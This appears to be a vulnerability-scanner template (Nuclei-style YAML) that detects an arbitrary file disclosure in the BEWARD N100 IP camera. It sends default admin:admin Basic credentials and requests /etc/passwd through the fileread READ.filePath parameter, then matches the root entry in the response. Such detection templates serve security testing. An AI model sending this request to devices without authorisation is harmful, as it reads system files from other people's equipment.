id: beward-ipcamera-disclosure
info:
  author: geeknik
  description: The N100 compact color IP camera suffers from an authenticated file
    disclosure vulnerability. Input passed via the READ.filePath parameter in fileread
    script is not properly verified before being used to read files. This can be exploited
    to disclose the contents of arbitrary files via absolute path or via the SendCGICMD
    API.
  name: BEWARD N100 H.264 VGA IP Camera M2.1.6 Arbitrary File Disclosure
  reference: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5511.php
  severity: high
  tags: beward,iot,camera,disclosure
requests:
- headers:
    Authorization: Basic YWRtaW46YWRtaW4=
  matchers:
  - condition: or
    regex:
    - 'root:[x*]:0:0:'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/cgi-bin/operator/fileread?READ.filePath=/etc/passwd'
